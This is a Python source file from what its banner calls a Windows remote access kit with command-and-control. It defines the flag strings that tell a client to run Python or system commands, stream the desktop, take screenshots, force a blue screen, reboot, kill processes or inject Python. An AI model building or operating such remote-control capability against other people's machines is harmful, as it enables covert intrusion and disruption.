#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.22
# -------------------------------------------------------------
#Class is for storing flag strings to make the client do different actions
class ClientActionFlags:
    def __init__(self):
        self.seperator = '<sep>'
        self.exec_python_code = 'python'
        self.ping_client = 'ping'
        self.system_command = 'system'
        self.reconnect_client = 'reconnect'
        self.stream_desktop = 'stream_desktop'
        self.screenshot = 'screenshot'
        self.extract_sys_ip_info = 'sys_info'
        self.blue_screen = 'bsod'
        self.reboot_computer = 'restart'
        self.shutdown_computer = 'shutdown'
        self.disconnect = 'disconnect'
        self.task_manager = 'proc_list'
        self.kill_process = 'terminate'
        self.snapshot = 'snap_shot'
        self.inject_python = 'inject_pie'